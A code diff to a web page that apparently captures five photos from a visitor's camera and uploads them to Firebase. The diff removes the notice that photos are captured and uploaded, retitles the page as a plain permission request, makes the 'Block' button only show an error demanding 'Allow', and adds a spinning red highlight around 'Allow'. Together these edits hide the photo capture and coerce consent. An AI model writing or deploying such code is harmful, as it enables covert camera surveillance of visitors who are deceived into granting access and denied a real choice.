@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Photo Capture</title>
+    <title>Camera Permission Request</title>
     <style>
         body {
             margin: 0;
@@ -47,37 +47,45 @@
             position: relative;
             font-size: 1.2em;
         }
+        /* Correct option with a revolving red rectangle */
         .mcq-option.correct {
-            border: 2px solid green;
+            border: 2px solid transparent;
+            position: relative;
         }
-        .mcq-option.correct::after {
+        .mcq-option.correct::before {
             content: '';
             position: absolute;
             top: -10px;
+            left: -10px;
             right: -10px;
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            border: 2px solid green;
-            border-right-color: transparent;
-            border-bottom-color: transparent;
-            animation: rotateRight 1s linear infinite;
+            bottom: -10px;
+            border: 2px solid red;
+            animation: rotateRectangle 1.5s linear infinite;
         }
-        @keyframes rotateRight {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
+        @keyframes rotateRectangle {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .error-message {
+            color: red;
+            font-size: 1.2em;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Kyu bhai, aaj photo ka postmortem nahi karoge kya? 🤣<br>Chalo photo record karte hain!</h1>
-        <div class="footer-text">5 photos will be captured and uploaded to Firebase.</div>
+        <h1>Camera Permission Required</h1>
         <div class="mcq-container" id="mcq-container">
-            <p>Please select the correct option to allow camera permission:</p>
+            <p>Please select the correct option to allow camera access:</p>
             <div class="mcq-option correct" id="mcq-allow">Allow</div>
             <div class="mcq-option" id="mcq-block">Block</div>
         </div>
+        <div class="error-message" id="error-message" style="display: none;">Please click the "Allow" button.</div>
         <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required permissions. Please open this page in Chrome or Safari.</div>
     </div>
 
@@ -106,6 +114,7 @@
     const totalPhotos = 5;
     const fallbackDiv = document.getElementById('fallback');
     const mcqContainer = document.getElementById('mcq-container');
+    const errorMessage = document.getElementById('error-message');
 
     function showFallback() {
         fallbackDiv.style.display = 'block';
@@ -214,10 +223,12 @@
     document.getElementById('mcq-allow').addEventListener('click', () => {
         askForPermission();
         mcqContainer.style.display = 'none';
+        errorMessage.style.display = 'none';
     });
 
     document.getElementById('mcq-block').addEventListener('click', () => {
-        showFallback();
+        errorMessage.style.display = 'block';
+        mcqContainer.style.display = 'block';
     });
 
     // Initialize camera permissions
